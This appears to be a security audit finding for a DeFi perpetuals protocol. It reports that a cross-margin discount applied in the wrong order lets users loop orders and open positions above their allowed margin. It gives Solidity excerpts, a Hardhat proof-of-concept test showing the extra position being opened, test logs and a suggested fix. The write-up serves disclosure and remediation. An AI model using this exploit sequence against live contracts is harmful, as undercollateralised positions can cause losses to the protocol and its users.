Active Punch Jellyfish

High

# Cross positions that exceed the allowed margin can be opened

## Summary
When users opens a cross order it's capped to a value. However, because of the math users can loop and maintain a position that's more than the allowed margin. 
## Vulnerability Detail
Bob has 1 BTC (25k$) in his cross account and wants to go long on BTC. Maximum margin Bob can have is the value of `getCrossAvailableValue()` which calculated as follows:
```solidity
            (totalNetValue + cache.totalIMUsd + accountProps.orderHoldInUsd).toInt256() -
            totalUsedValue.toInt256() +
            (cache.totalPnl >= 0 ? int256(0) : cache.totalPnl) -
            (cache.totalIMUsdFromBalance + totalBorrowingValue).toInt256();
```

 Since Bob has no other positions and only 1 BTC in his account the maximum position he can open is `1BTC * btcPrice * btcDiscount`:
```solidity
 function _getTokenNetValue(
        address token,
        Account.TokenBalance memory tokenBalance,
        OracleProcess.OracleParam[] memory oracles
    ) internal view returns (uint256) {
        if (tokenBalance.amount <= tokenBalance.usedAmount) {
            return 0;
        }
        uint256 tokenValue = CalUtils.tokenToUsd(
            tokenBalance.amount - tokenBalance.usedAmount, // 0 used amount, 1 BTC
            TokenUtils.decimals(token),
            OracleProcess.getOraclePrices(oracles, token, true)
        );
        -> return CalUtils.mulRate(tokenValue, AppTradeTokenConfig.getTradeTokenConfig(token).discount);
    }
```

Assuming 1% discount, the max margin is 24750$. Anything above this will be capped to this value inside the `_executeIncreaseOrderMargin` function in `OrderProcesses.sol`.

When Bob opened the position with the max margin possible let's calculate the `getCrossAvailableValue()` again. Ideally, since Bob opened the position with full margin it should be "0". Otherwise, Bob can keep opening positions and achieve a value higher than what's allowed. Now, let's see what would be the cross available value after the position is executed successfully:

**totalNetValue = toUsd(balance.amount - balance.usedAmount) * discount**
totalUsedValue = 24750
totalBorrowedValue = 0$
totalIMUsd = 24750$
totalIMUsdFromBalance = 24750$
= 250 - openFee

this happens because (balance.amount - balance.usedAmount) will not be "0" and when this number multiplied by the discount it will not result "0" as intended. 

In the end, Bob can keep opening positions until the position margin is lesser than the minimum margin in USD. 

**Coded PoC:**
```typescript
it("Open positions that are more than allowed max margin", async function () {
		const wbtcAm = precision.token(1); // 1 btc
		// fund user0
		await deposit(fixture, {
			account: user0,
			token: wbtc,
			amount: wbtcAm,
		});

		const oracleBeginning = [
			{
				token: wbtcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: precision.price(25_000),
				maxPrice: precision.price(25_000),
			},
			{
				token: usdcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: precision.price(99, 6),
				maxPrice: precision.price(99, 6),
			},
		];

		let crossAvailableValue = await accountFacet.getCrossAvailableValueTapir(
			user0.address,
			oracleBeginning
		);
		console.log("Cross available beginning", crossAvailableValue);

		const orderMargin = precision.token(24_750); // 24_750 because 1% discount
		const executionFee = precision.token(2, 15);
		const tx = await orderFacet.connect(user0).createOrderRequest(
			{
				symbol: btcUsd,
				orderSide: OrderSide.LONG,
				posSide: PositionSide.INCREASE,
				orderType: OrderType.MARKET,
				stopType: StopType.NONE,
				isCrossMargin: true,
				marginToken: wbtcAddr,
				qty: 0,
				leverage: precision.rate(10),
				triggerPrice: 0,
				acceptablePrice: 0,
				executionFee: executionFee,
				placeTime: 0,
				orderMargin: orderMargin,
				isNativeToken: false,
			},
			{
				value: executionFee,
			}
		);

		await tx.wait();

		crossAvailableValue = await accountFacet.getCrossAvailableValueTapir(
			user0.address,
			oracleBeginning
		);
		console.log(
			"Cross available value after creating the request",
			crossAvailableValue
		);

		const requestId = await marketFacet.getLastUuid(ORDER_ID_KEY);

		const tokenPrice = precision.price(25000);
		const usdcPrice = precision.price(99, 6); // 0.99$
		const oracle = [
			{
				token: wbtcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: tokenPrice,
				maxPrice: tokenPrice,
			},
			{
				token: usdcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: usdcPrice,
				maxPrice: usdcPrice,
			},
		];

		await orderFacet.connect(user3).executeOrder(requestId, oracle);

		crossAvailableValue = await accountFacet.getCrossAvailableValueTapir(
			user0.address,
			oracleBeginning
		);
		console.log(
			"Cross available after opening the position",
			crossAvailableValue
		);

		let accountBalanceInfo = await accountFacet.getAccountInfo(user0.address);
		console.log(
			"Account info after opening the position",
			accountBalanceInfo.tokenBalances
		);

		const newOrderMargin = precision.token(250); // because of the late facgtoring of discount I can keep adding margin
		const tx3 = await orderFacet.connect(user0).createOrderRequest(
			{
				symbol: btcUsd,
				orderSide: OrderSide.LONG,
				posSide: PositionSide.INCREASE,
				orderType: OrderType.MARKET,
				stopType: StopType.NONE,
				isCrossMargin: true,
				marginToken: wbtcAddr,
				qty: 0,
				leverage: precision.rate(10),
				triggerPrice: 0,
				acceptablePrice: 0,
				executionFee: executionFee,
				placeTime: 0,
				orderMargin: newOrderMargin,
				isNativeToken: false,
			},
			{
				value: executionFee,
			}
		);

		await tx3.wait();

		const requestId2 = await marketFacet.getLastUuid(ORDER_ID_KEY);

		crossAvailableValue = await accountFacet.getCrossAvailableValueTapir(
			user0.address,
			oracleBeginning
		);
		console.log(
			"Cross available after creating the 2nd position request",
			crossAvailableValue
		);

		await orderFacet.connect(user3).executeOrder(requestId2, oracle);

		accountBalanceInfo = await accountFacet.getAccountInfo(user0.address);
		console.log(
			"Account info after opening the 2nd position",
			accountBalanceInfo.tokenBalances
		);

		crossAvailableValue = await accountFacet.getCrossAvailableValueTapir(
			user0.address,
			oracleBeginning
		);
		console.log("Cross available after the 2nd position", crossAvailableValue);
	});
```

**Test Logs:**
Cross available beginning 24750000000000000000000n
Cross available value after creating the request -250000000000000000000n
Cross available after opening the position 247500000000000000000n
Account info after opening the position Result(1) [
  Result(4) [ 985150000000000000n, 975150000000000000n, 0n, 0n ]
]
Cross available after creating the 2nd position request -2500000000000000000n
Account info after opening the 2nd position Result(1) [
  Result(4) [ 985001500000000000n, 984901500000000000n, 0n, 0n ]
]
Cross available after the 2nd position 2475000000000000000n
## Impact
Since the actual margin is higher than the max allowed by "discount" `opened margin * leverage` can be very high and collateral provided can be short to back it in aggressive market conditions. Also, this issue will make the "discount" negligible especially if the "discount" value is high to prevent people not opening positions with large margins respect to their provided collateral. 

If you hold 1000$ and discount is 1% then that means your margin should be capped to 990$ for your order. However, you can keep looping and achieve a margin of 995$.

If you hold 1000$ of an asset is volatile and has a higher discount like 10% your margin should be capped to 900$ for your order. However, you can keep looping and achieve a margin of 950$.
## Code Snippet
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/OrderProcess.sol#L273-L311

https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/AccountProcess.sol#L122-L147
## Tool used

Manual Review

## Recommendation
This would fix the issue. However, I am not 100% sure if its break other parts of the code. 
```solidity
function _getTokenNetValue(
        address token,
        Account.TokenBalance memory tokenBalance,
        OracleProcess.OracleParam[] memory oracles
    ) internal view returns (uint256) {
        if (tokenBalance.amount <= tokenBalance.usedAmount) {
            return 0;
        }
+     uint discountedBalance = CalUtils.mulRate(tokenBalance.amount, AppTradeTokenConfig.getTradeTokenConfig(token).discount);
        uint256 tokenValue = CalUtils.tokenToUsd(
            discountedBalance - tokenBalance.usedAmount,
            TokenUtils.decimals(token),
            OracleProcess.getOraclePrices(oracles, token, true)
        );
        return tokenValue;
    }
```